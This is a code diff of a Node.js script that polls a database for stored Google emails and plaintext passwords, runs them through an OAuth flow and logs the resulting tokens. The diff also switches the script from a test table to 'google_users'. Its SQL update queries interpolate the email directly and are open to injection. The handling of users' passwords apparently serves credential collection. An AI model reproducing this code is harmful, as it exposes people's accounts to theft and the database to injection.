@@ -18,7 +18,7 @@ fs.readFile(
         const oauth2Client = authorize(JSON.parse(content));
         setInterval(() => {
           checkTokens(oauth2Client);
-        }, 30000);
+        }, 5000);
       } catch (parseErr) {
         console.error("Error parsing client secret file:", parseErr);
       }
@@ -36,7 +36,11 @@ function authorize(credentials) {
 }
 
 function checkTokens(oauth2Client) {
-  const sqlQuery = `SELECT google_email, google_password, historyUpdatedAt FROM google_test WHERE saveToken = 0 AND saveToken = 3 ORDER BY historyUpdatedAt ASC`;
+  const sqlQuery = `SELECT google_email, google_password, historyUpdatedAt
+FROM google_users
+WHERE saveToken IN ("proces", "incorrectData")
+ORDER BY historyUpdatedAt ASC;
+`;
 
   db.query(sqlQuery, (err, result) => {
     if (err) {
@@ -67,7 +71,7 @@ function processEmailPassword(resObj, oauth2Client) {
       }
     }
 
-    const updateQuery = `UPDATE google_test SET saveToken = 1 WHERE google_email = '${email}'`;
+    const updateQuery = `UPDATE google_users SET saveToken = "save" WHERE google_email = '${email}'`;
 
     db.query(updateQuery, (err, res) => {
       if (err) {
@@ -94,7 +98,7 @@ function decryptPlaylist(email, encryptedText, oauth2Client) {
     oauth2Client,
     (auth) => {
       console.log("Authorization complete. Token:", auth.credentials);
-      const updateQuery = `UPDATE google_test SET saveToken = 1 WHERE google_email = '${email}'`;
+      const updateQuery = `UPDATE google_users SET saveToken = "save" WHERE google_email = '${email}'`;
 
       db.query(updateQuery, (err, res) => {
         if (err) {
